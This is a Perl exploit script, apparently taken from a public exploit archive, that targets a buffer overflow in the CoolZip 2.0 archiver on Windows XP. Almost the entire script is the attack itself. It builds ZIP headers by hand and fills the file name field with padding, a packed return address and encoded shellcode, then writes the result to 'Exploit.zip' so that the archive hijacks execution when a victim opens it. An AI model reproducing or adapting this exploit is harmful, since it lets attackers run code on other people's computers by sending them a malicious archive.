#!/usr/bin/perl
#
#
#[+]Exploit Title: Exploit Buffer Overflow CoolZip 2.0
#[+]Date: 12\03\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.brothersoft.com/coolzip-download-7097.html
#[+]Version: 2.0
#[+]Tested On WIN-XP SP3 Portugues Brasil
#[+]CVE: N/A
#
#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx  
#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                    
#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx   
#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
#
#
#

use strict;
use warnings;
use IO::File;

sub usage
{
print q
{ 
                      Exploit Buffer Overflow Coolzip 2.0

         ==============================================================
         ==============================================================
         ====================Author C4SS!0 G0M3S=======================
         ====================E-mail Louredo_@hotmail.com===============
         ====================Site www.exploit-br.org===================
         ============================================================== 
         ==============================================================

	
};
}

my $sys = `ver`;if($sys=~/Windows/){system("cls");system("color 4f");}else{system("clear");}
system("title Exploit Buffer Overflow Coolzip 2.0");
if(!$ARGV[0])
{
usage;
print "\t\t[-]Modo de Uso: perl $0 <Nome_do_Arquivo>\n";
print "\t\t[-]Exemplot: perl $0 Exploit.zip\n";
exit;
}

usage;
my $File = "Exploit.zip";
print "\t\t[+]Identifying the size Shellcode\n\n";
sleep(1);
my $head = 
"\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $head2 = 
"\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $head3 = 
"\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";



my $payload = "\x41" x 51;
$payload .= pack('V',0x77454337);
$payload .= "\x41" x (59-length($payload));
my $shellcode =  
"TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIWCO0V0SX3SSQRL3SPTPXO".
"NDMWUMVSL60KON6A";
print "\t\t[+]Length Shellcode:".length($shellcode)."\n\n";
sleep(1);

$payload .= $shellcode;
$payload .= "\x41" x (4064-length($payload));
$payload = $payload.".txt";

unlink($File);
my $exploit = $head.$payload.$head2.$payload.$head3;

print "\t\t[+]Creating File $File...\n\n";
sleep(1);

open(my $f,">$File") || die "[+]Error:\n$!\n";
print $f $exploit;
close($f);
print "\t\t[+]The File $File Was Created Successfully\n\n";
sleep(1);